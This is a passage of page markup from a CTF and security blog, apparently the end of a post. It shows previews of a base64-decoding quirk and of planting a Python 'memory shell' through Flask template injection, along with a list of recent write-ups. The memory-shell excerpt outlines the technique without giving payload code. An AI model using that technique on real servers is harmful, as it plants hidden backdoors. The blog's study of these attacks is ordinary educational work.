class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-15</div><div class="info-item-2">base64解码小trick</div></div><div class="info-2"><div class="info-item-1">N1CTF Junior 2025 2&#x2F;2 中的，也是不出意料没做出来 python 的 base64 解码逻辑和命令行的 base64 命令是不一致的 Python 的base64.b64decode(..., validate=True)在遇到 padding（=）后还有额外的 base64 字符，会报错，而用默认解码base64.b64decode(...)时，只会解出等号前的那一部分 但是命令行中会将两段都成功解出并拼接 这是因为 Base64 的编码本质上是一系列 4 字符为一组的字符块，最后一组可能用 = 填充以满足块对齐，根据解析器类型的不同，解析方法也会有区别  **严格解析器（Python 的 ****validate=True**）：一旦遇到合法的填充字符 =，就认为这是该 base64 段的结束；如果填充后仍有数据，会报错为“padding 之后有额外数据” 宽松&#x2F;流式解析器（GNU **base64 -d** 等）：通常会把整个输入当作可能包含多个 base64 段（或忽略某些格式约束），会尽量解出每一段能解的部分，因此出现“先解出第一...</div></div></div></a><a class="pagination-related" href="/2025/07/21/python%E5%86%85%E5%AD%98%E9%A9%AC/" title="python 内存马"><img class="cover" src="/img/mygo3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-21</div><div class="info-item-2">python 内存马</div></div><div class="info-2"><div class="info-item-1">之前一直想学内存马，但是碍于对 java 的了解近乎为0，对jndi的了解也是只停留在会背面经的层面，所以一直没有去学，直到后来翻一些文章发现 python 也可以利用 SSTI 进行内存马注入，于是迅速开整 Flask常见的 Python Web 框架如 Django 和 Flask 都有可能存在 SSTI（Server-Side Template Injection，服务端模板注入）漏洞 在 Flask 中，使用 render_template_string() 渲染模板时，若将用户输入直接传入而未做过滤处理，就可能导致 SSTI 漏洞。攻击者可通过该漏洞注入恶意模板代码，从而实现 代码执行，甚至进一步植入 内存马 内存马注入原理（Flask 路由机制）Flask 常规注册路由的方式是通过装饰器 @app.route()，但底层实际是调用了： 1self.add_url_rule(rule, endpoint=None, view_func=None)  各参数说明如下：  rule：URL 路径（必须以 / 开头），与 @app.route() 中的路径一致 endpoin...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ALe</div><div class="author-info-description">从渗透测试到网安烧烤的一生</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ALe1293528"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">恐惧扼住咽喉，如枷锁禁锢我的双臂 我向沉默发问，沉默却愈发震耳欲聋</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E2%80%9C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E2%80%9D%E6%98%AF%E6%80%8E%E4%B9%88%E6%89%93%E5%87%BA%E6%9D%A5%E7%9A%84%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">关键“反序列化链”是怎么打出来的？</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/15/base64%E8%A7%A3%E7%A0%81%E5%B0%8Ftrick/" title="base64解码小trick"><img src="/img/mygo6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="base64解码小trick"/></a><div class="content"><a class="title" href="/2025/09/15/base64%E8%A7%A3%E7%A0%81%E5%B0%8Ftrick/" title="base64解码小trick">base64解码小trick</a><time datetime="2025-09-15T09:52:53.000Z" title="Created 2025-09-15 17:52:53">2025-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/24/NSSCTF-4th-wp/" title="NSSCTF 4th-wp"><img src="/img/mygo7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NSSCTF 4th-wp"/></a><div class="content"><a class="title" href="/2025/08/24/NSSCTF-4th-wp/" title="NSSCTF 4th-wp">NSSCTF 4th-wp</a><time datetime="2025-08-24T10:06:32.000Z" title="Created 2025-08-24 18:06:32">2025-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/23/SQL%20to%20RCE/" title="SQL to RCE"><img src="/img/mygo4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL to RCE"/></a><div class="content"><a class="title" href="/2025/08/23/SQL%20to%20RCE/" title="SQL to RCE">SQL to RCE</a><time datetime="2025-08-23T14:48:34.000Z" title="Created 2025-08-23 22:48:34">2025-08-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/21/Python-Bottle-SSTI/" title="Python Bottle SSTI"><img src="/img/mygo1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python Bottle SSTI"/></a><div class="content"><a class="title" href="/2025/08/21/Python-Bottle-SSTI/" title="Python Bottle SSTI">Python Bottle SSTI</a><time datetime="2025-08-21T10:13:50.000Z" title="Created 2025-08-21 18:13:50">2025-08-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/15/LilCTF2025-wp/" title="LilCTF2025-wp"><img src="/img/mygo6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LilCTF2025-wp"/></a><div class="content"><a class="title" href="/2025/08/15/LilCTF2025-wp/" title="LilCTF2025-wp">LilCTF2025-wp</a><time datetime="2025-08-15T12:53:12.000Z" title="Created 2025-08-15 20:53:12">2025-08-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By ALe</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>